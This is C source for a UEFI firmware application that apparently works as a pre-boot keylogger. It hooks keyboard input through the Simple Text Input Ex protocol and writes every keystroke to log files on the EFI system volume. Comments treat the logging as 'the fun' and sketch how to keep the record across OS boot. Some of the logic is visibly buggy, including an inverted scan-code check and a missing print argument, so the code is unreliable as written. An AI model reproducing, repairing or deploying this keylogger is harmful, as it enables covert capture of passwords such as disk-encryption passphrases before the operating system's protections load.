#include <efi.h>
#include <efilib.h>

// globals
EFI_FILE_PROTOCOL *File;
EFI_GUID gEfiSimpleTextInputExProtocolGuid = EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL_GUID;
EFI_EVENT KeyEvent;
EFI_EVENT mExitBootServicesEvent = NULL;
EFI_STATUS Status;
EFI_FILE_PROTOCOL *Root;
UINTN FileCounter = 1;

VOID reset_file()
{
    // this will use the *Root pointer
    // it will open a new file each time, named for the instance of the count of files
    // first, flush and close the current file
    Status = uefi_call_wrapper(File->Flush, 1, File);
    if (EFI_ERROR(Status))
    {
        Print(L"Error flushing current log file. Error code %d\n");
    }

    Status = uefi_call_wrapper(File->Close, 1, File);
    if (EFI_ERROR(Status))
    {
        Print(L"Error closing current log file. Error code %d\n", Status);
    }

    // next, open a new file named log<number>.txt
    CHAR16 buffer[128];
    UnicodeSPrint(buffer, sizeof(buffer), L"\\log_%d.txt", FileCounter);
    Status = uefi_call_wrapper(Root->Open, 5, Root, &File, buffer, EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);

    if (EFI_ERROR(Status))
    {
        Print(L"Error opening new log file. Error code %d\n", Status);
    }

    // iterate counter
    FileCounter++;

    // that should be all
}


UINTN AsciiStrLen (IN CONST CHAR8 *String)
{
    UINTN Length = 0;
    while (*String != '\0') {
        Length++;
        String++;
    }
    return Length;
}

EFI_STATUS EFIAPI key_notify_function(EFI_KEY_DATA *KeyData)
{
    /*
    * for reference
    CHAR8 *message = "Hello, World!\n";
    const UINTN messageSize = AsciiStrLen(message) + 1; // one extra for the null terminator
    Print(L"Message: %a\n", message);
    Print(L"Message size: %d bytes.\n", messageSize);
    Status = uefi_call_wrapper(File->Write, 3, File, &messageSize, message);
    Print(L"Wrote %d bytes.\n", messageSize);
    if (EFI_ERROR(Status)) {
        Print(L"Error writing to the file!\n");
        return Status;
    }*/

    // allocate a buffer
    CHAR16 buffer[32];

    // check the scancode
    // if it is zero, buffer should be "CHAR=<char>\n\0"
    // if it is not zero, buffer should be "CODE=<code>\n\0"
    if (KeyData->Key.ScanCode == 0)
    {
        SPrint(buffer, 32, L"CODE=%c\n", KeyData->Key.ScanCode);
    }
    else
    {
        // If we get `Enter`, we need to make a new log file
        if (KeyData->Key.UnicodeChar == 0x000a) // line feed
        {
            reset_file();
        }

        SPrint(buffer, 32, L"CHAR=%c\n", KeyData->Key.UnicodeChar);
    }

    // now write to the file

    UINTN messageSize = StrLen(buffer) * sizeof(CHAR16);
    const UINTN Status = uefi_call_wrapper(File->Write, 3, File, &messageSize, &buffer);
    if (EFI_ERROR(Status))
    {
        return Status;
    }

    return EFI_SUCCESS;
}

// we need to know when the OS is being booted
// and save the key log to a file
// otherwise, we might lose our record!
// VOID EFIAPI exit_boot_services (IN EFI_EVENT Event, IN VOID *Context)
// {
//     // this very simply just flushes and closes the file
//     // note that WE ARE NOT ALLOWED TO MODIFY MEMORY
//     // that means no addressing, freeing, etc.
//     // so basically we can't write to the file or declare variables or anything fancy like that.
//     Status = uefi_call_wrapper(File->Flush, 1, File);
//     if(EFI_ERROR(Status))
//     {
//         Print(L"Error flushing the file! Error code %d", Status);
//     }
//
//     Status = uefi_call_wrapper(File->Close, 1, File);
//     if (EFI_ERROR(Status))
//     {
//         Print(L"Error closing the file! Error code %d", Status);
//     }
//
// }

EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;

    UINTN HandleCount;
    EFI_HANDLE *HandleBuffer;
    EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *KeyboardProtocol;

    // Initialize the library
    InitializeLib(ImageHandle, SystemTable);

    // // create exit boot services event
    // Status = uefi_call_wrapper(BS->CreateEvent, 5,
    //     EVT_SIGNAL_EXIT_BOOT_SERVICES, // type
    //     TPL_NOTIFY,
    //     exit_boot_services,            // function to call
    //     NULL,                          // NotifyContext
    //     &mExitBootServicesEvent        // event
    // );

    // Locate all handles that support the Simple File System Protocol
    Status = uefi_call_wrapper(BS->LocateHandleBuffer, 5, ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &HandleBuffer);
    if (EFI_ERROR(Status)) {
        return Status;
    }

    // Iterate through the handles to find a valid file system
    for (UINTN Index = 0; Index < HandleCount; Index++) {
        Status = uefi_call_wrapper(BS->HandleProtocol, 3, HandleBuffer[Index], &gEfiSimpleFileSystemProtocolGuid, (VOID**)&FileSystem);
        if (!EFI_ERROR(Status)) {
            break;
        }
    }

    if (EFI_ERROR(Status)) {
        Print(L"Error initializing the protocol! %d\n", Status);
        return Status;
    }

    // open the volume
    Status = uefi_call_wrapper(FileSystem->OpenVolume, 2, FileSystem, &Root);
    if (EFI_ERROR(Status)) {
        // Handle error
        Print(L"Error opening the volume!\n");
        return Status;
    }

    // open \hello.txt

    Status = uefi_call_wrapper(Root->Open, 5, Root, &File, L"\\log0.txt", EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status)) {
        // Handle error
        Print(L"Error opening the file! %d\n", Status);
        return Status;
    }


    // Now for the fun: logging keystrokes!!
    // Locate all handles that support the EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL
    Status = uefi_call_wrapper(BS->LocateHandleBuffer, 5, ByProtocol, &gEfiSimpleTextInputExProtocolGuid, NULL, &HandleCount, &HandleBuffer);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to locate handles for Simple Text Input Ex Protocol. Error code %d\n", Status);
        return Status;
    }

    for (UINTN i = 0; i < HandleCount; i++) {
        Status = uefi_call_wrapper(BS->HandleProtocol, 3, HandleBuffer[i], &gEfiSimpleTextInputExProtocolGuid, &KeyboardProtocol);
        if (!EFI_ERROR(Status)) {
            Status = uefi_call_wrapper(KeyboardProtocol->RegisterKeyNotify, 4, KeyboardProtocol, NULL, key_notify_function, &KeyEvent);
            if (EFI_ERROR(Status)) {
                Print(L"Failed to register key notify function. Error code %d\n", Status);
            }
        }
    }

    uefi_call_wrapper(BS->FreePool, 1, HandleBuffer);

    return EFI_SUCCESS;
}


    